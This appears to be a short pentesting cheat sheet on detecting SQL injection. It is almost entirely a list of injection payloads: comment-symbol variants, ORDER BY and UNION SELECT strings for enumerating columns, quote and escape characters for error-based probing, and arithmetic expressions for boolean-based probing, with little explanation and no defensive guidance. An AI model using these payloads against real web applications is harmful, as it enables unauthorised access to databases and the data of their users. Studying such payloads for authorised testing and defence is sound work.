<h1>SQL injection detection</h1>

# IN BAND (Classic)

# UNION BASED


"--" Symbol Alternative
```
— 	Inline comment
#	Inline comment
/* 	Block comment
*/ 	Block comment
```
# Column enumeration 

======================================================================================================================================================================
Method 1
```
ORDER BY 1 --+
ORDER BY 2 --+
ORDER BY 3 --+
ORDER BY 4 --+
ORDER BY 5 --+
ORDER BY 6 --+
ORDER BY 7 --+
ORDER BY 8 --+
ORDER BY 9 --+
ORDER BY 10 --+
ORDER BY 11 --+.....
```

=======================================================================================================================================================================
 ORDER BY 1 --+   
 Alternative :  ' ORDER BY 1 --+ ; " ORDER BY 1 --+ ;

Method 2

```
UNION SELECT NULL --+
UNION SELECT NULL,NULL --+
UNION SELECT NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+ ......................................
```
==================================================================================================================

Method 3

```
UNION SELECT 1 --+
UNION SELECT 1,2 --+
UNION SELECT 1,2,3 --+
UNION SELECT 1,2,3,4 --+
UNION SELECT 1,2,3,4,5 --+
UNION SELECT 1,2,3,4,5,6 --+
UNION SELECT 1,2,3,4,5,6,7 --+
UNION SELECT 1,2,3,4,5,6,7,8 --+
UNION SELECT 1,2,3,4,5,6,7,8,9 --+
UNION SELECT 1,2,3,4,5,6,7,8,9,10 --+
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --+ ..........................................................................
```

==========================================================================================================================

ERROR BASED

``` '
''
`
``
,
"
""
/
//
\
\\
;
```
BOOLEAN BASED
```
1 AND 1
2 OR 3
2-1
2^1
3*1

```
Other Resources:
https://www.w3schools.com/sql/sql_comments.asp
